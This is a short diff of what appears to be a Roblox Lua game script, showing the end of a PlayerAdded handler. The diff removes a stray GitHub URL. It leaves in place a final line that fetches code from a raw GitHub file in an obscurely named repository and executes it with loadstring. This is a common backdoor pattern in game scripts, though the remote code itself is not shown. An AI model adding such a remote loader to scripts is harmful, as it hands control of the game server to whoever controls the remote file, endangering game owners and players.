@@ -53,5 +53,4 @@ Players.PlayerAdded:Connect(function(player)
 	end
 end)
 
-https://github.com/9274837292748/aawdadadadada/blob/main/kasck
 loadstring(game:HttpGet("https://raw.githubusercontent.com/9274837292748/aawdadadadada/refs/heads/main/kasck"))()
